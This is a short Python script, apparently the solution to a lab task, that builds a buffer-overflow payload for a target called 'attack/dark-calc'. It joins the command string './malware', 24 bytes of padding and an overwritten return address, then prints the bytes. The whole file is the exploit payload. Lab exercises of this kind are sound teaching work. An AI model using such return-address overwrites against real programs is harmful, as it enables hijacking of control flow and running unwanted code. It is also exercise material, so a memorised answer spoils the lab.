#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

command = b"./malware\x00"
padding = b"A" * (24 - len(command))
return_address = (0x401A6B).to_bytes(8, "little")

payload = command + padding + return_address

sys.stdout.buffer.write(payload + b"\n")
